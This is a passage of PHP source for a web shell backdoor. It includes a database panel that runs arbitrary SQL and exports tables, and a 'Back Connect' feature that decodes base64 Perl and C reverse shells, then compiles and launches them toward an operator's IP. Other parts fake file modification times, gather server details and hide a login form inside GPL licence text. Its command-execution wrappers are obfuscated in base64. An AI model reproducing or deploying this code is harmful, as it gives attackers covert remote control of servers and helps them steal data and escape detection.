echo '<input onclick=\'this.select();\' style=\'width:100px; height:20px; color:#000; background:#FFDDDD; border:0px double #FF0000; padding:2px;\' value="'.implode($matches21[1]).'"><br>';
echo '<input onclick=\'this.select();\' style=\'width:100px; height:20px; color:#000; background:#FFDDDD; border:0px double #FF0000; padding:2px;\' value="'.implode($matches11[1]).'"><br>';
echo '<input onclick=\'this.select();\' style=\'width:100px; height:20px; color:#000; background:#FFDDDD; border:0px double #FF0000; padding:2px;\' value="'.implode($matches31[1]).'">';
}
formhead(array(
  'name' => 'recordlist'
 ));
 makehide('doing');
 makehide('action', 'sqladmin');
 makehide('base64');
 makehide('tablename');
 p($dbform);
 formfoot();
 formhead(array(
  'name' => 'setdbname'
 ));
 makehide('action', 'sqladmin');
 p($dbform);
 if (!$dbname) {
  makehide('dbname');
 }
 formfoot();
 formhead(array(
  'name' => 'settable'
 ));
 makehide('action', 'sqladmin');
 p($dbform);
 makehide('tablename');
 makehide('page', $page);
 makehide('doing');
 formfoot();
 $cachetables = array();
 $pagenum  = 30;
 $page  = intval($page);
 if ($page) {
  $start_limit = ($page - 1) * $pagenum;
 } else {
  $start_limit = 0;
  $page  = 1;
 }
 if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
  dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
  $mysqlver = mysql_get_server_info();
  p('<p>MySQL ' . $mysqlver . ' running in ' . $dbhost . ' as ' . $dbuser . '@' . $dbhost . '</p>');
  $highver = $mysqlver > '4.1' ? 1 : 0;
  $query = q("SHOW DATABASES");
  $dbs  = array();
  $dbs[] = '-- Select a database --';
  while ($db = mysql_fetch_array($query)) {
 $dbs[$db['Database']] = $db['Database'];
  }
  makeselect(array(
 'title' => 'Please select a database:',
 'name' => 'db[]',
 'option' => $dbs,
 'selected' => $dbname,
 'onchange' => 'moddbname(this.options[this.selectedIndex].value)',
 'newline' => 1
  ));
  $tabledb = array();
  if ($dbname) {
 p('<p>');
 p('Current dababase: <a href="javascript:moddbname(\'' . $dbname . '\');">' . $dbname . '</a>');
 if ($tablename) {
  p(' | Current Table: <a href="javascript:settable(\'' . $tablename . '\');">' . $tablename . '</a> [ <a href="javascript:settable(\'' . $tablename . '\', \'insert\');">Insert</a> | <a href="javascript:settable(\'' . $tablename . '\', \'structure\');">Structure</a> | <a href="javascript:settable(\'' . $tablename . '\', \'drop\');">Drop</a> ]');
 }
 p('</p>');
 mysql_select_db($dbname);
 $getnumsql = '';
 $runquery  = 0;
 if ($sql_query) {
  $runquery = 1;
 }
 $allowedit = 0;
 if ($tablename && !$sql_query) {
  $sql_query = "SELECT * FROM $tablename";
  $getnumsql = $sql_query;
  $sql_query = $sql_query . " LIMIT $start_limit, $pagenum";
  $allowedit = 1;
 }
 p('<form action="' . $self . '" method="POST">');
 p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database ' . $dbname . ':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">' . htmlspecialchars($sql_query, ENT_QUOTES) . '</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
 makehide('tablename', $tablename);
 makehide('action', 'sqladmin');
 p($dbform);
 p('</form>');
 if ($tablename || ($runquery && $sql_query)) {
  if ($doing == 'structure') {
   $result = q("SHOW COLUMNS FROM $tablename");
   $rowdb  = array();
   while ($row = mysql_fetch_array($result)) {
  $rowdb[] = $row;
   }
   p('<table border="0" cellpadding="3" cellspacing="0">');
   p('<tr class="head">');
   p('<td>Field</td>');
   p('<td>Type</td>');
   p('<td>Null</td>');
   p('<td>Key</td>');
   p('<td>Default</td>');
   p('<td>Extra</td>');
   p('</tr>');
   foreach ($rowdb as $row) {
  $thisbg = bg();
  p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
  p('<td>' . $row['Field'] . '</td>');
  p('<td>' . $row['Type'] . '</td>');
  p('<td>' . $row['Null'] . '&nbsp;</td>');
  p('<td>' . $row['Key'] . '&nbsp;</td>');
  p('<td>' . $row['Default'] . '&nbsp;</td>');
  p('<td>' . $row['Extra'] . '&nbsp;</td>');
  p('</tr>');
   }
   tbfoot();
  } elseif ($doing == 'insert' || $doing == 'edit') {
   $result = q('SHOW COLUMNS FROM ' . $tablename);
   while ($row = mysql_fetch_array($result)) {
  $rowdb[] = $row;
   }
   $rs = array();
   if ($doing == 'insert') {
  p('<h2>Insert new line in ' . $tablename . ' table &raquo;</h2>');
   } else {
  p('<h2>Update record in ' . $tablename . ' table &raquo;</h2>');
  $where  = base64_decode($base64);
  $result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
  $rs  = mysql_fetch_array($result);
   }
   p('<form method="post" action="' . $self . '">');
   p($dbform);
   makehide('action', 'sqladmin');
   makehide('tablename', $tablename);
   p('<table border="0" cellpadding="3" cellspacing="0">');
   foreach ($rowdb as $row) {
  if ($rs[$row['Field']]) {
   $value = htmlspecialchars($rs[$row['Field']]);
  } else {
   $value = '';
  }
  $thisbg = bg();
  p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
  p('<td><b>' . $row['Field'] . '</b><br />' . $row['Type'] . '</td><td><textarea class="area" name="insertsql[' . $row['Field'] . ']" style="width:1200px;height:260px;overflow:auto;">' . $value . '</textarea></td></tr>');
   }
   if ($doing == 'insert') {
  p('<tr class="' . bg() . '"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
   } else {
  p('<tr class="' . bg() . '"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
  makehide('base64', $base64);
   }
   p('</table></form>');
  } else {
   $querys = @explode(';', $sql_query);
   foreach ($querys as $num => $query) {
  if ($query) {
   p("<p><b>Query#{$num} : " . htmlspecialchars($query, ENT_QUOTES) . "</b></p>");
   switch (qy($query)) {
    case 0:
   p('<h2>Error : ' . mysql_error() . '</h2>');
   break;
    case 1:
   if (strtolower(substr($query, 0, 13)) == 'select * from') {
    $allowedit = 1;
   }
   if ($getnumsql) {
    $tatol  = mysql_num_rows(q($getnumsql));
    $multipage = multi($tatol, $pagenum, $page, $tablename);
   }
   if (!$tablename) {
    $sql_line = str_replace(array(
     "\r",
     "\n",
     "\t"
    ), array(
     ' ',
     ' ',
     ' '
    ), trim(htmlspecialchars($query)));
    $sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
    preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i", $sql_line, $matches);
    $tablename = $matches[1][0];
   }
   $result = q($query);
   p($multipage);
   p('<table border="0" cellpadding="3" cellspacing="0">');
   p('<tr class="head">');
   if ($allowedit)
    p('<td>Action</td>');
   $fieldnum = @mysql_num_fields($result);
   for ($i = 0; $i < $fieldnum; $i++) {
    $name = @mysql_field_name($result, $i);
    $type = @mysql_field_type($result, $i);
    $len  = @mysql_field_len($result, $i);
    p("<td nowrap>$name<br><span>$type($len)</span></td>");
   }
   p('</tr>');
   while ($mn = @mysql_fetch_assoc($result)) {
    $thisbg = bg();
    p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
    $where = $tmp = $b1 = '';
    foreach ($mn as $key => $inside) {
     if ($inside) {
    $where .= $tmp . $key . "='" . addslashes($inside) . "'";
    $tmp = ' AND ';
     }
     $b1 .= '<td nowrap>' . html_clean($inside) . '&nbsp;</td>';
    }
    $where = base64_encode($where);
    if ($allowedit)
     p('<td nowrap><a href="javascript:editrecord(\'edit\', \'' . $where . '\', \'' . $tablename . '\');">Edit</a> | <a href="javascript:editrecord(\'del\', \'' . $where . '\', \'' . $tablename . '\');">Del</a></td>');
    p($b1);
    p('</tr>');
    unset($b1);
   }
   tbfoot();
   p($multipage);
   break;
    case 2:
   $ar = mysql_affected_rows();
   p('<h2>affected rows : <b>' . $ar . '</b></h2>');
   break;
   }
  }
   }
  }
 } else {
  $query  = q("SHOW TABLE STATUS");
  $table_num = $table_rows = $data_size = 0;
  $tabledb = array();
  while ($table = mysql_fetch_array($query)) {
   $data_size = $data_size + $table['Data_length'];
   $table_rows   = $table_rows + $table['Rows'];
   $table['Data_length'] = sizecount($table['Data_length']);
   $table_num++;
   $tabledb[] = $table;
  }
  $data_size = sizecount($data_size);
  unset($table);
  p('<table border="0" cellpadding="0" cellspacing="0">');
  p('<form action="' . $self . '" method="POST">');
  makehide('action', 'sqladmin');
  p($dbform);
  p('<tr class="head">');
  p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
  p('<td>Name</td>');
  p('<td>Rows</td>');
  p('<td>Data_length</td>');
  p('<td>Create_time</td>');
  p('<td>Update_time</td>');
  if ($highver) {
   p('<td>Engine</td>');
   p('<td>Collation</td>');
  }
  p('</tr>');
  foreach ($tabledb as $key => $table) {
   $thisbg = bg();
   p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
   p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="' . $table['Name'] . '" /></td>');
   p('<td><a href="javascript:settable(\'' . $table['Name'] . '\');">' . $table['Name'] . '</a> [ <a href="javascript:settable(\'' . $table['Name'] . '\', \'insert\');">Insert</a> | <a href="javascript:settable(\'' . $table['Name'] . '\', \'structure\');">Structure</a> | <a href="javascript:settable(\'' . $table['Name'] . '\', \'drop\');">Drop</a> ]</td>');
   p('<td>' . $table['Rows'] . '</td>');
   p('<td>' . $table['Data_length'] . '</td>');
   p('<td>' . $table['Create_time'] . '</td>');
   p('<td>' . $table['Update_time'] . '</td>');
   if ($highver) {
  p('<td>' . $table['Engine'] . '</td>');
  p('<td>' . $table['Collation'] . '</td>');
   }
   p('</tr>');
  }
  p('<tr class=' . bg() . '>');
  p('<td>&nbsp;</td>');
  p('<td>Total tables: ' . $table_num . '</td>');
  p('<td>' . $table_rows . '</td>');
  p('<td>' . $data_size . '</td>');
  p('<td colspan="' . ($highver ? 4 : 2) . '">&nbsp;</td>');
  p('</tr>');
  p("<tr class=\"" . bg() . "\"><td colspan=\"" . ($highver ? 8 : 6) . "\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"path\" value=\"" . ROOT_SA . $_SERVER['HTTP_HOST'] . "_MySQL.sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" name=\"downrar\" value=\"Export selection table\" /></td></tr>");
  makehide('doing', 'backupmysql');
  formfoot();
  p("</table>");
  fr($query);
 }
  }
 }
 tbfoot();
 @mysql_close();
} elseif ($action == 'backconnect') {
 !$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
 !$yourport && $yourport = '12345';
 $usedb = array(
  'perl' => 'perl',
  'c' => 'c'
 );
 $con_back = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj" . "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR" . "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT" . "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI" . "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi" . "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl" . "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
 $con_back_c = "I2luY2x1ZGUgPHN0ZGlvLmg DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC" . "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb" . "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd" . "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ" . "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC" . "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D" . "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp" . "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
 eval($con_back . $con_back_c);
 if ($start && $yourip && $yourport && $use) {
  if ($use == 'perl') {
 cf('/tmp/klop_bc', $con_back);
 $res = execute(which('perl') . " /tmp/klop_bc $yourip $yourport &");
  } else {
 cf('/tmp/klop_bc.c', $con_back_c);
 $res = execute('gcc -o /tmp/klop_bc /tmp/klop_bc.c');
 @unlink('/tmp/klop_bc.c');
 $res = execute("/tmp/klop_bc $yourip $yourport &");
  }
  m("Now script try connect to $yourip port $yourport ...");
 }
 formhead(array(
  'title' => 'Back Connect'
 ));
 makehide('action', 'backconnect');
 p('<p>');
 p('Your IP:');
 makeinput(array(
  'name' => 'yourip',
  'size' => 20,
  'value' => $yourip
 ));
 p('Your Port:');
 makeinput(array(
  'name' => 'yourport',
  'size' => 15,
  'value' => $yourport
 ));
 p('Use:');
 makeselect(array(
  'name' => 'use',
  'option' => $usedb,
  'selected' => $use
 ));
 makeinput(array(
  'name' => 'start',
  'value' => 'Start',
  'type' => 'submit',
  'class' => 'bt'
 ));
 p('</p>');
 formfoot();
} elseif ($action == 'editfile') {
 if (file_exists($opfile)) {
  $fp  = @fopen($opfile, 'r');
  $contents = @fread($fp, filesize($opfile));
  @fclose($fp);
  $contents = htmlspecialchars($contents);
 }
 formhead(array(
  'title' => 'Create / Edit File'
 ));
 makehide('action', 'file');
 makehide('dir', $nowpath);
 makeinput(array(
  'title' => 'Current File (import new file name and new file)',
  'name' => 'editfilename',
  'value' => $opfile,
  'newline' => 1
 ));
 maketext(array(
  'title' => 'File Content',
  'name' => 'filecontent',
  'value' => $contents
 ));
 formfooter();
} elseif ($action == 'newtime') {
 $opfilemtime = @filemtime($opfile);
 $cachemonth  = array(
  'January' => 1,
  'February' => 2,
  'March' => 3,
  'April' => 4,
  'May' => 5,
  'June' => 6,
  'July' => 7,
  'August' => 8,
  'September' => 9,
  'October' => 10,
  'November' => 11,
  'December' => 12
 );
 formhead(array(
  'title' => 'Clone file was last modified time'
 ));
 makehide('action', 'file');
 makehide('dir', $nowpath);
 makeinput(array(
  'title' => 'Alter file',
  'name' => 'curfile',
  'value' => $opfile,
  'size' => 120,
  'newline' => 1
 ));
 makeinput(array(
  'title' => 'Reference file (fullpath)',
  'name' => 'tarfile',
  'size' => 120,
  'newline' => 1
 ));
 formfooter();
 formhead(array(
  'title' => 'Set last modified'
 ));
 makehide('action', 'file');
 makehide('dir', $nowpath);
 makeinput(array(
  'title' => 'Current file (fullpath)',
  'name' => 'curfile',
  'value' => $opfile,
  'size' => 120,
  'newline' => 1
 ));
 p('<p>Instead &raquo;');
 p('year:');
 makeinput(array(
  'name' => 'year',
  'value' => date('Y', $opfilemtime),
  'size' => 4
 ));
 p('month:');
 makeinput(array(
  'name' => 'month',
  'value' => date('m', $opfilemtime),
  'size' => 2
 ));
 p('day:');
 makeinput(array(
  'name' => 'day',
  'value' => date('d', $opfilemtime),
  'size' => 2
 ));
 p('hour:');
 makeinput(array(
  'name' => 'hour',
  'value' => date('H', $opfilemtime),
  'size' => 2
 ));
 p('minute:');
 makeinput(array(
  'name' => 'minute',
  'value' => date('i', $opfilemtime),
  'size' => 2
 ));
 p('second:');
 makeinput(array(
  'name' => 'second',
  'value' => date('s', $opfilemtime),
  'size' => 2
 ));
 p('</p>');
 formfooter();
} elseif ($action == 'phpenv') {
 $upsize = getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
 $poshmail = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
 !$func_dis && $func_dis = 'No';
 $info = array(
  1 => array(
 'Server Time',
 date('Y/m/d h:i:s', $timestamp)
  ),
  2 => array(
 'Server Domain',
 $_SERVER['SERVER_NAME']
  ),
  3 => array(
 'Server IP',
 gethostbyname($_SERVER['SERVER_NAME'])
  ),
  4 => array(
 'Server OS',
 PHP_OS
  ),
  5 => array(
 'Server OS Charset',
 $_SERVER['HTTP_ACCEPT_LANGUAGE']
  ),
  6 => array(
 'Server Software',
 $_SERVER['SERVER_SOFTWARE']
  ),
  7 => array(
 'Server Web Port',
 $_SERVER['SERVER_PORT']
  ),
  8 => array(
 'PHP run mode',
 strtoupper(php_sapi_name())
  ),
  9 => array(
 'The file path',
 __FILE__
  ),
  10 => array(
 'PHP Version',
 PHP_VERSION
  ),
  11 => array(
 'PHPINFO',
 (PHPINFO_IS ? '<a href="javascript:goaction(\'phpinfo\');">Yes</a>' : 'No')
  ),
  12 => array(
 'Safe Mode',
 getcfg('safe_mode')
  ),
  13 => array(
 'Administrator',
 $poshmail
  ),
  14 => array(
 'allow_url_fopen',
 getcfg('allow_url_fopen')
  ),
  15 => array(
 'enable_dl',
 getcfg('enable_dl')
  ),
  16 => array(
 'display_errors',
 getcfg('display_errors')
  ),
  17 => array(
 'register_globals',
 getcfg('register_globals')
  ),
  18 => array(
 'magic_quotes_gpc',
 getcfg('magic_quotes_gpc')
  ),
  19 => array(
 'memory_limit',
 getcfg('memory_limit')
  ),
  20 => array(
 'post_max_size',
 getcfg('post_max_size')
  ),
  21 => array(
 'upload_max_filesize',
 $upsize
  ),
  22 => array(
 'max_execution_time',
 getcfg('max_execution_time') . ' second(s)'
  ),
  23 => array(
 'disable_functions',
 $func_dis
  )
 );
} else {
 m('Undefined Action');
}
?>
</td></tr></table>
</body></html>
<?php
function m($msg)
{
 echo '<div style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;">';
 echo $msg;
 echo '</div>';
}
function scookie($key, $value, $life = 0, $prefix = 1)
{
 global $posh, $timestamp, $_SERVER;
 $key  = ($prefix ? $posh['cookiepre'] : '') . $key;
 $life = $life ? $life : $posh['cookielife'];
 $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
 setcookie($key, $value, $timestamp + $life, $posh['cookiepath'], $posh['cookiedomain'], $useport);
}
function multi($num, $perpage, $curpage, $tablename)
{
 $multipage = '';
 if ($num > $perpage) {
  $page = 10;
  $offset = 5;
  $pages  = @ceil($num / $perpage);
  if ($page > $pages) {
 $from = 1;
 $to = $pages;
  } else {
 $from = $curpage - $offset;
 $to = $curpage + $page - $offset - 1;
 if ($from < 1) {
  $to = $curpage + 1 - $from;
  $from = 1;
  if (($to - $from) < $page && ($to - $from) < $pages) {
   $to = $page;
  }
 } elseif ($to > $pages) {
  $from = $curpage - $pages + $to;
  $to = $pages;
  if (($to - $from) < $page && ($to - $from) < $pages) {
   $from = $pages - $page + 1;
  }
 }
  }
  $multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\'' . $tablename . '\', \'\', 1);">First</a> ' : '') . ($curpage > 1 ? '<a href="javascript:settable(\'' . $tablename . '\', \'\', ' . ($curpage - 1) . ');">Prev</a> ' : '');
  for ($i = $from; $i <= $to; $i++) {
 $multipage .= $i == $curpage ? $i . ' ' : '<a href="javascript:settable(\'' . $tablename . '\', \'\', ' . $i . ');">[' . $i . ']</a> ';
  }
  $multipage .= ($curpage < $pages ? '<a href="javascript:settable(\'' . $tablename . '\', \'\', ' . ($curpage + 1) . ');">Next</a>' : '') . ($to < $pages ? ' <a href="javascript:settable(\'' . $tablename . '\', \'\', ' . $pages . ');">Last</a>' : '');
  $multipage = $multipage ? '<p>Pages: ' . $multipage . '</p>' : '';
 }
 return $multipage;
}
function loginpage()
{
$txt = 
'<noindex>
<style type="text/css">
input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
</style><pre>   GNU GENERAL PUBLIC LICENSE
    Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. &lt;http://fsf.org/&gt;
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

   Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.
<form method="POST" action=""><input name="password" type="password" size="1"> 

For the developers and authors protection, the GPL clearly explains
that there is no warranty for this free software.  For both users and
authors sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.
<input type="hidden" name="doing" value="login"><input type="submit" value="&nbsp;"></form> Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.</pre>';
print $txt;
 exit;
}
$GLOBA['_523922241_'] = Array(
 base64_decode('ZnVuY3' . 'Rpb' . '25fZXhpc3R' . 'z'),
 base64_decode('' . 'ZXhlYw=='),
 base64_decode('am9p' . 'bg=='),
 base64_decode('' . 'Z' . 'n' . 'VuY3' . 'Rpb25f' . 'ZXhpc' . '3' . 'Rz'),
 base64_decode('c' . '2hlbGxfZXhlYw=='),
 base64_decode('Zn' . 'VuY' . '3R' . 'pb' . '25f' . 'ZXh' . 'pc3Rz'),
 base64_decode('b' . '2Jf' . 'c3Rhcn' . 'Q='),
 base64_decode('c3lzdGV' . 't'),
 base64_decode('b' . '2J' . 'fZ2V0X2N' . 'vbnRlbn' . 'Rz'),
 base64_decode('b' . '2J' . 'fZW5kX2N' . 's' . 'ZWFu'),
 base64_decode('ZnVuY3' . 'R' . 'pb25fZ' . 'Xh' . 'pc3Rz'),
 base64_decode('b2J' . 'f' . 'c' . '3RhcnQ='),
 base64_decode('cGFz' . 'c3RocnU' . '='),
 base64_decode('' . 'b2JfZ2V0' . 'X2NvbnRlbn' . 'R' . 'z'),
 base64_decode('b' . '2Jf' . 'ZW5' . 'kX2NsZ' . 'W' . 'Fu'),
 base64_decode('aXNfc' . 'm' . 'Vz' . 'b' . '3V' . 'y' . 'Y2U' . '='),
 base64_decode('cG' . '9w' . 'ZW' . '4' . '='),
 base64_decode('' . 'ZmVvZg=' . '='),
 base64_decode('Z' . 'n' . 'JlY' . 'WQ='),
 base64_decode('cG' . 'Nsb3Nl')
);
function _2124234062($i)
{
 $as = Array(
  '',
  'ZXhlYw==',
  'Cg==',
  'c2hlbGxfZXhlYw==',
  'c3lzdGVt',
  'cGFzc3RocnU=',
  'cg==',
  ''
 );
 return		 base64_decode		 ($as[$i]);
}
function l__0($_0)
{
 $_1 = _2124234062(0);
 if ($_0) {
  if ($GLOBA['_523922241_'][0](_2124234062(1))) {
 @$GLOBA['_523922241_'][1]($_0, $_1);
 $_1 = $GLOBA['_523922241_'][2](_2124234062(2), $_1);
  } elseif ($GLOBA['_523922241_'][3](_2124234062(3))) {
 $_1 = @$GLOBA['_523922241_'][4]($_0);
  } elseif ($GLOBA['_523922241_'][5](_2124234062(4))) {
 @$GLOBA['_523922241_'][6]();
 @$GLOBA['_523922241_'][7]($_0);
 $_1 = @$GLOBA['_523922241_'][8]();
 @$GLOBA['_523922241_'][9]();
  } elseif ($GLOBA['_523922241_'][10](_2124234062(5))) {
 @$GLOBA['_523922241_'][11]();
 @$GLOBA['_523922241_'][12]($_0);
 $_1 = @$GLOBA['_523922241_'][13]();
 @$GLOBA['_523922241_'][14]();
  } elseif (@$GLOBA['_523922241_'][15]($_2 = @$GLOBA['_523922241_'][16]($_0, _2124234062(6)))) {
 $_1 = _2124234062(7);
 while (!@$GLOBA['_523922241_'][17]($_2)) {
  $_1 .= @$GLOBA['_523922241_'][18]($_2, round(0 + 512 + 512));
 }
 @$GLOBA['_523922241_'][19]($_2);
  }
 }
 return $_1;
}
function which($pr)
{
 $path = execute("which $pr");
 return ($path ? $path : $pr);
}
function cf($fname, $text)
{
 if ($fp = @fopen($fname, 'w')) {
  @fputs($fp, @base64_decode($text));
  @fclose($fp);
 }
}
function dbconn($dbhost, $dbuser, $dbpass, $dbname = '', $charset = '', $dbport = '3306')
{
 if (!$link = @mysql_connect($dbhost . ':' . $dbport, $dbuser, $dbpass)) {
  p('<h2>Can not connect to MySQL server</h2>');
  exit;
 }
 if ($link && $dbname) {
  if (!@mysql_select_db($dbname, $link)) {
 p('<h2>Database selected has error</h2>');
 exit;
  }
 }
 if ($link && mysql_get_server_info() > '4.1') {
  if (in_array(strtolower($charset), array(
 'cp1251',
 'windows-1251',
 'utf8'
  ))) {
 q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
  }
 }
 return $link;
}
function s_array(&$array)
{
 if (is_array($array)) {
  foreach ($array as $k => $v) {
 $array[$k] = s_array($v);
  }
 } else if (is_string($array)) {
  $array = stripslashes($array);
 }
 return $array;
}
function html_clean($content)
{
 $content = htmlspecialchars($content);
 $content = str_replace("\n", "<br />", $content);
 $content = str_replace(" ", "&nbsp;&nbsp;", $content);
 $content = str_replace("\t", "&nbsp;&nbsp;&nbsp;&nbsp;", $content);
 return $content;
}
function getChmod($filepath)
{
 return substr(base_convert(@fileperms($filepath), 10, 8), -4);
}
function getPerms($filepath)
{
 $mode = @fileperms($filepath);
 if (($mode & 0xC000) === 0xC000) {
  $type = 's';
 } elseif (($mode & 0x4000) === 0x4000) {
  $type = 'd';
 } elseif (($mode & 0xA000) === 0xA000) {
  $type = 'l';
 } elseif (($mode & 0x8000) === 0x8000) {
  $type = '-';
 } elseif (($mode & 0x6000) === 0x6000) {
  $type = 'b';
 } elseif (($mode & 0x2000) === 0x2000) {
  $type = 'c';
 } elseif (($mode & 0x1000) === 0x1000) {
  $type = 'p';
 } else {
  $type = '?';
 }
 $owner['read'] = ($mode & 00400) ? 'r' : '-';
 $owner['write'] = ($mode & 00200) ? 'w' : '-';
 $owner['execute'] = ($mode & 00100) ? 'x' : '-';
 $group['read'] = ($mode & 00040) ? 'r' : '-';
 $group['write'] = ($mode & 00020) ? 'w' : '-';
 $group['execute'] = ($mode & 00010) ? 'x' : '-';
 $world['read'] = ($mode & 00004) ? 'r' : '-';
 $world['write'] = ($mode & 00002) ? 'w' : '-';
 $world['execute'] = ($mode & 00001) ? 'x' : '-';
 if ($mode & 0x800) {
  $owner['execute'] = ($owner['execute'] == 'x') ? 's' : 'S';
 }
 if ($mode & 0x400) {
  $group['execute'] = ($group['execute'] == 'x') ? 's' : 'S';
 }
 if ($mode & 0x200) {
  $world['execute'] = ($world['execute'] == 'x') ? 't' : 'T';
 }
